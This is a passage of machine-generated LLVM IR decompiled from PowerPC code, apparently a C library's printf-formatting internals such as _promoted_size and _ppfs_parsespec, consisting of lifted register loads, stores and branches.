  %v1_1001addc = zext i8 %tmp32 to i32
  %v2_1001ade0 = icmp ugt i8 %v3_1001add8, 6
  store i1 %v2_1001ade0, i1* %cr7_gt.global-to-local, align 1
  %v2_1001ade4 = add nuw nsw i32 %v1_1001addc, %v4_1001add8
  store i32 %v2_1001ade4, i32* %r9.global-to-local, align 4
  %v1_1001ade8 = trunc i32 %v2_1001ade4 to i8
  store i8 %v1_1001ade8, i8* %v2_1001add8, align 1
  %v0_1001adec = load i1, i1* %cr7_gt.global-to-local, align 1
  %v0_1001ae0c = load i32, i32* @r10, align 4
  br i1 %v0_1001adec, label %dec_label_pc_1001ae0c, label %dec_label_pc_1001adf0

dec_label_pc_1001adf0:                            ; preds = %dec_label_pc_1001add8
  %v1_1001adf0 = add i32 %v0_1001ae0c, 8
  %v2_1001adf0 = inttoptr i32 %v1_1001adf0 to i32*
  %v3_1001adf0 = load i32, i32* %v2_1001adf0, align 4
  store i32 %v3_1001adf0, i32* %r0.global-to-local, align 4
  %v0_1001adf4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001adf4 = urem i32 %v0_1001adf4, 256
  %v1_1001adf8 = mul nuw nsw i32 %v1_1001adf4, 4
  store i32 %v1_1001adf8, i32* %r11.global-to-local, align 4
  %v1_1001adfc = add nuw nsw i32 %v1_1001adf4, 2
  store i32 %v1_1001adfc, i32* %r9.global-to-local, align 4
  %v1_1001ae00 = trunc i32 %v1_1001adfc to i8
  %v2_1001ae00 = load i32, i32* @r3, align 4
  %v3_1001ae00 = add i32 %v2_1001ae00, 76
  %v4_1001ae00 = inttoptr i32 %v3_1001ae00 to i8*
  store i8 %v1_1001ae00, i8* %v4_1001ae00, align 1
  %v0_1001ae04 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001ae04 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001ae04 = add i32 %v1_1001ae04, %v0_1001ae04
  store i32 %v2_1001ae04, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001ae20

dec_label_pc_1001ae0c:                            ; preds = %dec_label_pc_1001add8
  %v1_1001ae0c = add i32 %v0_1001ae0c, 4
  %v2_1001ae0c = inttoptr i32 %v1_1001ae0c to i32*
  %v3_1001ae0c = load i32, i32* %v2_1001ae0c, align 4
  %v1_1001ae10 = add i32 %v3_1001ae0c, 7
  store i32 %v1_1001ae10, i32* %r9.global-to-local, align 4
  %v1_1001ae14 = call i32 @__asm_rlwinm(i32 %v1_1001ae10, i32 0, i32 0, i32 28)
  store i32 %v1_1001ae14, i32* %r11.global-to-local, align 4
  %v1_1001ae18 = add i32 %v1_1001ae14, 8
  store i32 %v1_1001ae18, i32* %r0.global-to-local, align 4
  %v1_1001ae1c = load i32, i32* @r10, align 4
  %v2_1001ae1c = add i32 %v1_1001ae1c, 4
  %v3_1001ae1c = inttoptr i32 %v2_1001ae1c to i32*
  store i32 %v1_1001ae18, i32* %v3_1001ae1c, align 4
  %v0_1001ae20.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001ae20

dec_label_pc_1001ae20:                            ; preds = %dec_label_pc_1001adf0, %dec_label_pc_1001ae0c
  %v0_1001ae20 = phi i32 [ %v2_1001ae04, %dec_label_pc_1001adf0 ], [ %v0_1001ae20.pre, %dec_label_pc_1001ae0c ]
  %v1_1001ae20 = inttoptr i32 %v0_1001ae20 to i32*
  %v2_1001ae20 = load i32, i32* %v1_1001ae20, align 4
  store i32 %v2_1001ae20, i32* %r9.global-to-local, align 4
  %v1_1001ae24 = add i32 %v0_1001ae20, 4
  %v2_1001ae24 = inttoptr i32 %v1_1001ae24 to i32*
  %v3_1001ae24 = load i32, i32* %v2_1001ae24, align 4
  store i32 %v3_1001ae24, i32* @r10, align 4
  %v1_1001ae28 = load i32, i32* @r8, align 4
  %v2_1001ae28 = inttoptr i32 %v1_1001ae28 to i32*
  store i32 %v2_1001ae20, i32* %v2_1001ae28, align 4
  %v0_1001ae2c = load i32, i32* @r10, align 4
  %v1_1001ae2c = load i32, i32* @r8, align 4
  %v2_1001ae2c = add i32 %v1_1001ae2c, 4
  %v3_1001ae2c = inttoptr i32 %v2_1001ae2c to i32*
  store i32 %v0_1001ae2c, i32* %v3_1001ae2c, align 4
  br label %dec_label_pc_1001aeb8

dec_label_pc_1001ae34:                            ; preds = %dec_label_pc_1001adcc, %dec_label_pc_1001add0
  store i32 %v1_1001ad9c, i32* @r10, align 4
  %v1_1001ae38 = add i32 %v2_1001ae98, 77
  %v2_1001ae38 = inttoptr i32 %v1_1001ae38 to i8*
  %v3_1001ae38 = load i8, i8* %v2_1001ae38, align 1
  %v4_1001ae38 = zext i8 %v3_1001ae38 to i32
  store i32 %v4_1001ae38, i32* %r11.global-to-local, align 4
  %v2_1001ae3c = icmp ugt i8 %v3_1001ae38, 8
  store i1 %v2_1001ae3c, i1* %cr7_gt.global-to-local, align 1
  %tmp29 = icmp ugt i8 %v3_1001ae38, 7
  br i1 %tmp29, label %dec_label_pc_1001ae60, label %dec_label_pc_1001ae44

dec_label_pc_1001ae44:                            ; preds = %dec_label_pc_1001ae34
  %v1_1001ae44 = add i32 %v2_1001ae98, 84
  %v2_1001ae44 = inttoptr i32 %v1_1001ae44 to i32*
  %v3_1001ae44 = load i32, i32* %v2_1001ae44, align 4
  store i32 %v3_1001ae44, i32* %r9.global-to-local, align 4
  %v1_1001ae48 = mul nuw nsw i32 %v4_1001ae38, 8
  store i32 %v1_1001ae48, i32* %r0.global-to-local, align 4
  %v1_1001ae4c = add nuw nsw i32 %v4_1001ae38, 1
  store i32 %v1_1001ae4c, i32* %r11.global-to-local, align 4
  %v1_1001ae50 = trunc i32 %v1_1001ae4c to i8
  store i8 %v1_1001ae50, i8* %v2_1001ae38, align 1
  %v0_1001ae54 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001ae54 = add i32 %v0_1001ae54, 32
  %v1_1001ae58 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001ae58 = add i32 %v1_1001ae54, %v1_1001ae58
  store i32 %v2_1001ae58, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001aeb8

dec_label_pc_1001ae60:                            ; preds = %dec_label_pc_1001ae34
  %v1_1001ae60 = add i32 %v2_1001ae98, 80
  %v2_1001ae60 = inttoptr i32 %v1_1001ae60 to i32*
  %v3_1001ae60 = load i32, i32* %v2_1001ae60, align 4
  %v1_1001ae64 = add i32 %v3_1001ae60, 7
  store i32 %v1_1001ae64, i32* %r9.global-to-local, align 4
  %v1_1001ae68 = call i32 @__asm_rlwinm(i32 %v1_1001ae64, i32 0, i32 0, i32 28)
  store i32 %v1_1001ae68, i32* %r9.global-to-local, align 4
  %v1_1001ae6c = add i32 %v1_1001ae68, 8
  store i32 %v1_1001ae6c, i32* %r0.global-to-local, align 4
  %v1_1001ae70 = load i32, i32* @r10, align 4
  %v2_1001ae70 = add i32 %v1_1001ae70, 4
  %v3_1001ae70 = inttoptr i32 %v2_1001ae70 to i32*
  store i32 %v1_1001ae6c, i32* %v3_1001ae70, align 4
  br label %dec_label_pc_1001aeb8

dec_label_pc_1001ae80:                            ; preds = %dec_label_pc_1001adcc, %dec_label_pc_1001add0, %dec_label_pc_1001adb8, %dec_label_pc_1001ada4
  %v2_1001ae80 = inttoptr i32 %v1_1001ad9c to i8*
  %v3_1001ae80 = load i8, i8* %v2_1001ae80, align 1
  %v4_1001ae80 = zext i8 %v3_1001ae80 to i32
  store i32 %v4_1001ae80, i32* %r11.global-to-local, align 4
  %v2_1001ae84 = icmp ugt i8 %v3_1001ae80, 8
  store i1 %v2_1001ae84, i1* %cr7_gt.global-to-local, align 1
  %tmp30 = icmp ugt i8 %v3_1001ae80, 7
  br i1 %tmp30, label %dec_label_pc_1001aea4, label %dec_label_pc_1001ae8c

dec_label_pc_1001ae8c:                            ; preds = %dec_label_pc_1001ae80
  %v1_1001ae8c = add i32 %v2_1001ae98, 84
  %v2_1001ae8c = inttoptr i32 %v1_1001ae8c to i32*
  %v3_1001ae8c = load i32, i32* %v2_1001ae8c, align 4
  store i32 %v3_1001ae8c, i32* %r0.global-to-local, align 4
  %v1_1001ae90 = mul nuw nsw i32 %v4_1001ae80, 4
  store i32 %v1_1001ae90, i32* %r9.global-to-local, align 4
  %v1_1001ae94 = add nuw nsw i32 %v4_1001ae80, 1
  store i32 %v1_1001ae94, i32* %r11.global-to-local, align 4
  %v1_1001ae98 = trunc i32 %v1_1001ae94 to i8
  store i8 %v1_1001ae98, i8* %v2_1001ae80, align 1
  %v0_1001ae9c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001ae9c = load i32, i32* %r0.global-to-local, align 4
  %v2_1001ae9c = add i32 %v1_1001ae9c, %v0_1001ae9c
  store i32 %v2_1001ae9c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001aeb0

dec_label_pc_1001aea4:                            ; preds = %dec_label_pc_1001ae80
  %v1_1001aea4 = add i32 %v2_1001ae98, 80
  %v2_1001aea4 = inttoptr i32 %v1_1001aea4 to i32*
  %v3_1001aea4 = load i32, i32* %v2_1001aea4, align 4
  store i32 %v3_1001aea4, i32* %r9.global-to-local, align 4
  %v1_1001aea8 = add i32 %v3_1001aea4, 4
  store i32 %v1_1001aea8, i32* %r0.global-to-local, align 4
  store i32 %v1_1001aea8, i32* %v2_1001aea4, align 4
  %v0_1001aeb0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001aeb0

dec_label_pc_1001aeb0:                            ; preds = %dec_label_pc_1001ae8c, %dec_label_pc_1001aea4
  %v0_1001aeb0 = phi i32 [ %v2_1001ae9c, %dec_label_pc_1001ae8c ], [ %v0_1001aeb0.pre, %dec_label_pc_1001aea4 ]
  %v1_1001aeb0 = inttoptr i32 %v0_1001aeb0 to i32*
  %v2_1001aeb0 = load i32, i32* %v1_1001aeb0, align 4
  store i32 %v2_1001aeb0, i32* %r0.global-to-local, align 4
  %v1_1001aeb4 = load i32, i32* @r8, align 4
  %v2_1001aeb4 = inttoptr i32 %v1_1001aeb4 to i32*
  store i32 %v2_1001aeb0, i32* %v2_1001aeb4, align 4
  br label %dec_label_pc_1001aeb8

dec_label_pc_1001aeb8:                            ; preds = %dec_label_pc_1001ae60, %dec_label_pc_1001ae44, %dec_label_pc_1001ae20, %dec_label_pc_1001aeb0
  %v0_1001aeb8 = load i32, i32* @r8, align 4
  %v1_1001aeb8 = add i32 %v0_1001aeb8, 8
  store i32 %v1_1001aeb8, i32* @r8, align 4
  %v0_1001aebc.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1001aec0.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1001aebc

dec_label_pc_1001aebc:                            ; preds = %dec_label_pc_1001ad88, %dec_label_pc_1001aeb8
  %v0_1001aec0 = phi i32 [ %v2_1001ae98, %dec_label_pc_1001ad88 ], [ %v0_1001aec0.pre, %dec_label_pc_1001aeb8 ]
  %v0_1001aebc = phi i32 [ %v0_1001ad88, %dec_label_pc_1001ad88 ], [ %v0_1001aebc.pre, %dec_label_pc_1001aeb8 ]
  %v1_1001aebc = add i32 %v0_1001aebc, 1
  store i32 %v1_1001aebc, i32* %r7.global-to-local, align 4
  %v1_1001aec0 = add i32 %v0_1001aec0, 28
  %v2_1001aec0 = inttoptr i32 %v1_1001aec0 to i32*
  %v3_1001aec0 = load i32, i32* %v2_1001aec0, align 4
  store i32 %v3_1001aec0, i32* %r0.global-to-local, align 4
  %v2_1001aec4 = icmp slt i32 %v1_1001aebc, %v3_1001aec0
  %v3_1001aec4 = icmp sgt i32 %v1_1001aebc, %v3_1001aec0
  store i1 %v3_1001aec4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1001aec4, label %dec_label_pc_1001ad88, label %dec_label_pc_1001af10

dec_label_pc_1001aed0:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1001aed4 = icmp ne i32 %v3_1001acd8, -2147483648
  %v4_1001aed4 = icmp eq i32 %v3_1001acd8, -2147483648
  store i1 %v3_1001aed4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1001aed4, label %dec_label_pc_1001aedc, label %dec_label_pc_1001aef0

dec_label_pc_1001aedc:                            ; preds = %dec_label_pc_1001aed0
  %v1_1001aedc = add i32 %v0_1001acd0, 36
  %v2_1001aedc = inttoptr i32 %v1_1001aedc to i8*
  %v3_1001aedc = load i8, i8* %v2_1001aedc, align 1
  %v4_1001aedc = zext i8 %v3_1001aedc to i32
  %v1_1001aee0 = mul nuw nsw i32 %v4_1001aedc, 8
  %v2_1001aee4 = add i32 %v1_1001aee0, %v1_1001acd4
  store i32 %v2_1001aee4, i32* %r9.global-to-local, align 4
  %v1_1001aee8 = add i32 %v2_1001aee4, -8
  %v2_1001aee8 = inttoptr i32 %v1_1001aee8 to i32*
  %v3_1001aee8 = load i32, i32* %v2_1001aee8, align 4
  store i32 %v3_1001aee8, i32* %r0.global-to-local, align 4
  store i32 %v3_1001aee8, i32* %v2_1001acd8, align 4
  %v0_1001aef0.pre = load i32, i32* @r3, align 4
  %v1_1001aef4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001aef0

dec_label_pc_1001aef0:                            ; preds = %dec_label_pc_1001aed0, %dec_label_pc_1001aedc
  %v1_1001aef4 = phi i32 [ -2147483648, %dec_label_pc_1001aed0 ], [ %v1_1001aef4.pre, %dec_label_pc_1001aedc ]
  %v1_1001af0c = phi i32 [ %v0_1001acd0, %dec_label_pc_1001aed0 ], [ %v0_1001aef0.pre, %dec_label_pc_1001aedc ]
  %v1_1001aef0 = add i32 %v1_1001af0c, 4
  %v2_1001aef0 = inttoptr i32 %v1_1001aef0 to i32*
  %v3_1001aef0 = load i32, i32* %v2_1001aef0, align 4
  store i32 %v3_1001aef0, i32* %r0.global-to-local, align 4
  %v3_1001aef4 = icmp sgt i32 %v3_1001aef0, %v1_1001aef4
  %v4_1001aef4 = icmp eq i32 %v3_1001aef0, %v1_1001aef4
  store i1 %v3_1001aef4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1001aef4, label %dec_label_pc_1001aefc, label %dec_label_pc_1001af10

dec_label_pc_1001aefc:                            ; preds = %dec_label_pc_1001aef0
  %v1_1001aefc = add i32 %v1_1001af0c, 37
  %v2_1001aefc = inttoptr i32 %v1_1001aefc to i8*
  %v3_1001aefc = load i8, i8* %v2_1001aefc, align 1
  %v4_1001aefc = zext i8 %v3_1001aefc to i32
  %v1_1001af00 = mul nuw nsw i32 %v4_1001aefc, 8
  %v1_1001af04 = load i32, i32* @r8, align 4
  %v2_1001af04 = add i32 %v1_1001af00, %v1_1001af04
  store i32 %v2_1001af04, i32* %r9.global-to-local, align 4
  %v1_1001af08 = add i32 %v2_1001af04, -8
  %v2_1001af08 = inttoptr i32 %v1_1001af08 to i32*
  %v3_1001af08 = load i32, i32* %v2_1001af08, align 4
  store i32 %v3_1001af08, i32* %r0.global-to-local, align 4
  store i32 %v3_1001af08, i32* %v2_1001aef0, align 4
  %v0_1001af10.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1001af10

dec_label_pc_1001af10:                            ; preds = %dec_label_pc_1001aebc, %dec_label_pc_1001aec0.preheader, %dec_label_pc_1001aef0, %dec_label_pc_1001aefc
  %v0_1001af10 = phi i32 [ %v1_1001af0c, %dec_label_pc_1001aef0 ], [ %v0_1001af10.pre, %dec_label_pc_1001aefc ], [ %v0_1001aec05, %dec_label_pc_1001aec0.preheader ], [ %v0_1001aec0, %dec_label_pc_1001aebc ]
  %v1_1001af10 = add i32 %v0_1001af10, 8
  %v2_1001af10 = inttoptr i32 %v1_1001af10 to i32*
  %v3_1001af10 = load i32, i32* %v2_1001af10, align 4
  store i32 %v3_1001af10, i32* %r11.global-to-local, align 4
  %v2_1001af14 = icmp sgt i32 %v3_1001af10, 0
  store i1 %v2_1001af14, i1* %cr7_gt.global-to-local, align 1
  %v0_1001af18 = load i32, i32* @lr, align 4
  %tmp31 = icmp sgt i32 %v3_1001af10, -1
  call void @__pseudo_cond_branch(i1 %tmp31, i32 %v0_1001af18)
  %v0_1001af1c = load i32, i32* @r3, align 4
  %v1_1001af1c = add i32 %v0_1001af1c, 16
  %v2_1001af1c = inttoptr i32 %v1_1001af1c to i32*
  %v3_1001af1c = load i32, i32* %v2_1001af1c, align 4
  store i32 %v3_1001af1c, i32* %r0.global-to-local, align 4
  %v0_1001af20 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001af20 = sub i32 0, %v0_1001af20
  store i32 %v1_1001af20, i32* @r11, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_1001af28 = add i32 %v0_1001af1c, 8
  %v3_1001af28 = inttoptr i32 %v2_1001af28 to i32*
  store i32 %v1_1001af20, i32* %v3_1001af28, align 4
  %v0_1001af2c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001af2c = load i32, i32* @r3, align 4
  %v2_1001af2c = add i32 %v1_1001af2c, 20
  %v3_1001af2c = inttoptr i32 %v2_1001af2c to i32*
  store i32 %v0_1001af2c, i32* %v3_1001af2c, align 4
  %v0_1001af30 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001af30 = or i32 %v0_1001af30, 8
  store i32 %v1_1001af30, i32* %r0.global-to-local, align 4
  %v1_1001af34 = call i32 @__asm_rlwinm(i32 %v1_1001af30, i32 0, i32 0, i32 30)
  store i32 %v1_1001af34, i32* %r0.global-to-local, align 4
  %v1_1001af38 = load i32, i32* @r3, align 4
  %v2_1001af38 = add i32 %v1_1001af38, 16
  %v3_1001af38 = inttoptr i32 %v2_1001af38 to i32*
  store i32 %v1_1001af34, i32* %v3_1001af38, align 4
  %v0_1001af3c = load i32, i32* @r3, align 4
  ret i32 %v0_1001af3c

; uselistorder directives
  uselistorder i32 %v3_1001aef0, { 1, 0, 2 }
  uselistorder i32 %v1_1001aef4, { 1, 0 }
  uselistorder i32 %v3_1001aec0, { 1, 0, 2 }
  uselistorder i32 %v1_1001aebc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1001aec0, { 0, 2, 1 }
  uselistorder i32 %v4_1001ae80, { 1, 0, 2 }
  uselistorder i32 %v4_1001ae38, { 1, 0, 2 }
  uselistorder i32 %v0_1001ae20, { 1, 0 }
  uselistorder i32 %v1_1001adf4, { 1, 0 }
  uselistorder i32 %v0_1001ae0c, { 1, 0 }
  uselistorder i8 %v3_1001add8, { 1, 0, 2 }
  uselistorder i32 %v1_1001ad9c, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1001ad90, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_1001ad88, { 1, 0 }
  uselistorder i32 %v2_1001ae98, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_1001aec05, { 1, 0, 2 }
  uselistorder i32 %v4_1001ad40, { 1, 0, 2 }
  uselistorder i32 %v3_1001ad30, { 1, 0, 2 }
  uselistorder i32 %v2_1001ad5c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v4_1001acf0, { 1, 0, 2 }
  uselistorder i32 %v3_1001acd8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_1001acd0, { 1, 0, 2 }
  uselistorder i32 %v0_1001acd0, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 20, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32 }
  uselistorder i1* %cr7_gt.global-to-local, { 3, 4, 5, 14, 6, 7, 8, 9, 2, 0, 10, 11, 12, 13, 1, 15, 16, 17, 18, 19 }
  uselistorder i32 76, { 3, 4, 5, 6, 1, 0, 2, 7 }
  uselistorder label %dec_label_pc_1001af10, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1001aef0, { 1, 0 }
  uselistorder label %dec_label_pc_1001aebc, { 1, 0 }
  uselistorder label %dec_label_pc_1001aeb8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001aeb0, { 1, 0 }
  uselistorder label %dec_label_pc_1001ae80, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1001ae34, { 1, 0 }
  uselistorder label %dec_label_pc_1001ae20, { 1, 0 }
  uselistorder label %dec_label_pc_1001ad88, { 1, 0 }
  uselistorder label %dec_label_pc_1001aec0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1001ad74, { 1, 0 }
  uselistorder label %dec_label_pc_1001ad30, { 1, 0 }
  uselistorder label %dec_label_pc_1001ad24, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_1001af4c

dec_label_pc_1001af4c:                            ; preds = %dec_label_pc_1001af4c, %entry
  %v0_1001af4c = phi i32 [ ptrtoint (i32* @global_var_1002e494.1167 to i32), %entry ], [ %v1_1001af4c, %dec_label_pc_1001af4c ]
  %v1_1001af4c = add i32 %v0_1001af4c, -2
  %v2_1001af4c = inttoptr i32 %v1_1001af4c to i16*
  %v3_1001af4c = load i16, i16* %v2_1001af4c, align 2
  %v4_1001af4c = sext i16 %v3_1001af4c to i32
  %v4_1001af50 = icmp eq i32 %v4_1001af4c, %arg1
  %v3_1001af54.not = icmp ule i32 %v1_1001af4c, ptrtoint (i32* @global_var_1002e47c.1168 to i32)
  %brmerge = or i1 %v4_1001af50, %v3_1001af54.not
  br i1 %brmerge, label %dec_label_pc_1001af60, label %dec_label_pc_1001af4c

dec_label_pc_1001af60:                            ; preds = %dec_label_pc_1001af4c
  %v2_1001af68 = sub i32 %v1_1001af4c, ptrtoint (i32* @global_var_1002e47c.1168 to i32)
  %v1_1001af70 = udiv i32 %v2_1001af68, 2
  %v2_1001af70 = and i32 %v2_1001af68, -2147483648
  %v3_1001af70 = or i32 %v1_1001af70, %v2_1001af70
  store i32 ptrtoint (i32* @global_var_1002e494.1167 to i32), i32* @r11, align 4
  %v2_1001af78 = add i32 %v3_1001af70, ptrtoint (i32* @global_var_1002e494.1167 to i32)
  %v3_1001af78 = inttoptr i32 %v2_1001af78 to i8*
  %v4_1001af78 = load i8, i8* %v3_1001af78, align 1
  %v5_1001af78 = zext i8 %v4_1001af78 to i32
  ret i32 %v5_1001af78

; uselistorder directives
  uselistorder i32 %v2_1001af68, { 1, 0 }
  uselistorder i32 %v1_1001af4c, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e47c.1168 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e494.1167 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_1001af84 = load i32, i32* @lr, align 4
  store i32 %v0_1001af84, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_1001af9c = add i32 %tmp, 16
  %v2_1001af9c = inttoptr i32 %v1_1001af9c to i32*
  %v3_1001af9c = load i32, i32* %v2_1001af9c, align 4
  store i32 %v3_1001af9c, i32* %r0.global-to-local, align 4
  %v1_1001afac = and i32 %v3_1001af9c, 128
  store i32 %v1_1001afac, i32* %r5.global-to-local, align 4
  %v3_1001afac = icmp eq i32 %v1_1001afac, 0
  store i32 8, i32* %stack_var_-104, align 4
  %v1_1001afb4 = add i32 %tmp, 24
  %v2_1001afb4 = inttoptr i32 %v1_1001afb4 to i32*
  %v3_1001afb4 = load i32, i32* %v2_1001afb4, align 4
  store i32 %v3_1001afb4, i32* @r26, align 4
  br i1 %v3_1001afac, label %dec_label_pc_1001afbc, label %dec_label_pc_1001afd4

dec_label_pc_1001afbc:                            ; preds = %entry
  %v2_1001afbc = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_1001b028

dec_label_pc_1001afcc:                            ; preds = %dec_label_pc_1001b1fc
  %v1_1001afcc = add i32 %v0_1001b1cc, 1
  store i32 %v1_1001afcc, i32* @r30, align 4
  br label %dec_label_pc_1001b214

dec_label_pc_1001afd4:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_1001afd8 = load i32, i32* %arg1, align 4
  store i32 %v2_1001afd8, i32* %r7.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1001afe4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1001afe4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1001afe8

dec_label_pc_1001afe8:                            ; preds = %dec_label_pc_1001b018.dec_label_pc_1001afe8_crit_edge, %dec_label_pc_1001afd4
  %v0_1001aff0 = phi i32 [ %v0_1001aff0.pre, %dec_label_pc_1001b018.dec_label_pc_1001afe8_crit_edge ], [ %v2_1001afd8, %dec_label_pc_1001afd4 ]
  %v0_1001afec = phi i32 [ %v0_1001afec.pre, %dec_label_pc_1001b018.dec_label_pc_1001afe8_crit_edge ], [ %v2_1001afe4, %dec_label_pc_1001afd4 ]
  %v0_1001aff4 = phi i32 [ %v0_1001afe8.pre, %dec_label_pc_1001b018.dec_label_pc_1001afe8_crit_edge ], [ 0, %dec_label_pc_1001afd4 ]
  %v1_1001afe8 = mul i32 %v0_1001aff4, 4
  %v2_1001afec = add i32 %v0_1001aff4, %v0_1001afec
  store i32 %v2_1001afec, i32* @r10, align 4
  %v2_1001aff0 = add i32 %v1_1001afe8, %v0_1001aff0
  store i32 %v2_1001aff0, i32* @r11, align 4
  %v1_1001aff4 = add i32 %v0_1001aff4, 1
  store i32 %v1_1001aff4, i32* @r8, align 4
  %v1_1001aff8 = add i32 %v2_1001aff0, -4
  %v2_1001aff8 = inttoptr i32 %v1_1001aff8 to i32*
  %v3_1001aff8 = load i32, i32* %v2_1001aff8, align 4
  store i32 %v3_1001aff8, i32* %r9.global-to-local, align 4
  %v1_1001affc = trunc i32 %v3_1001aff8 to i8
  %v3_1001affc = add i32 %v2_1001afec, 24
  %v4_1001affc = inttoptr i32 %v3_1001affc to i8*
  store i8 %v1_1001affc, i8* %v4_1001affc, align 1
  %v0_1001b000 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001b000 = urem i32 %v0_1001b000, 256
  store i32 %v1_1001b000, i32* %r9.global-to-local, align 4
  %v0_1001b008 = load i32, i32* @r11, align 4
  %v1_1001b008 = add i32 %v0_1001b008, -4
  %v2_1001b008 = inttoptr i32 %v1_1001b008 to i32*
  %v3_1001b008 = load i32, i32* %v2_1001b008, align 4
  store i32 %v3_1001b008, i32* %r0.global-to-local, align 4
  %v4_1001b00c = icmp eq i32 %v1_1001b000, %v3_1001b008
  br i1 %v4_1001b00c, label %dec_label_pc_1001b014, label %dec_label_pc_1001b484

dec_label_pc_1001b014:                            ; preds = %dec_label_pc_1001afe8
  %v3_1001b004 = icmp eq i32 %v1_1001b000, 0
  br i1 %v3_1001b004, label %dec_label_pc_1001b01c, label %dec_label_pc_1001b018

dec_label_pc_1001b018:                            ; preds = %dec_label_pc_1001b014
  %v0_1001b018 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001b018 = add i32 %v0_1001b018, -1
  store i32 %v1_1001b018, i32* %ctr.global-to-local, align 4
  %v2_1001b018 = icmp eq i32 %v1_1001b018, 0
  br i1 %v2_1001b018, label %dec_label_pc_1001b01c, label %dec_label_pc_1001b018.dec_label_pc_1001afe8_crit_edge

dec_label_pc_1001b018.dec_label_pc_1001afe8_crit_edge: ; preds = %dec_label_pc_1001b018
  %v0_1001afe8.pre = load i32, i32* @r8, align 4
  %v0_1001afec.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1001aff0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1001afe8

dec_label_pc_1001b01c:                            ; preds = %dec_label_pc_1001b018, %dec_label_pc_1001b014
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1001b020 = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_1001b028

dec_label_pc_1001b028:                            ; preds = %dec_label_pc_1001afbc, %dec_label_pc_1001b01c
  %v2_1001b038.pre-phi = phi i32 [ %.pre, %dec_label_pc_1001afbc ], [ %v2_1001afe4, %dec_label_pc_1001b01c ]
  %storemerge3 = phi i32 [ %v2_1001afbc, %dec_label_pc_1001afbc ], [ %v2_1001b020, %dec_label_pc_1001b01c ]
  store i32 %storemerge3, i32* @r10, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r27, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* @r25, align 4
  store i32 %v2_1001b038.pre-phi, i32* @r29, align 4
  store i32 268697600, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001b048

dec_label_pc_1001b044:                            ; preds = %dec_label_pc_1001b154, %dec_label_pc_1001b1d8
